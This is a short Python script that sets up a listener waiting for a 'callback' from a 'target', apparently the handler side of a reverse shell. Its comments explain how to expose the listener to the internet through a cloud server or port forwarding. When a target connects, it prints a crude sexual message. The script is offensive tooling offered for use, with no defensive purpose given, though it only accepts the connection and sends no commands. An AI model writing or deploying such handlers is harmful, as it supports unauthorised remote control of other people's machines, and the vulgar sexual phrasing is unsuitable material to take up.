#!/usr/bin/env python3

#import socket API module
import socket

# for LAN you can use your pc's ip.
# for WAN you need to setup your own server in aws or digital ocean get the IP of said server and you can just ssh to that machine and run this script. other option is to use your own ISP public ip address and port forward to your pc's ip address.
serverIp = '192.168.1.1'
serverPort = 8080 
server = socket.socket()
server.bind((serverIp, serverPort))
print('Server is online')
print('Listening for callback')

#listening for callback
server.listen(1)
target, target_addr = server.accept()

#will display once callback is initiated
print(f'[+] {target_addr} She spreads the legs, it is time')

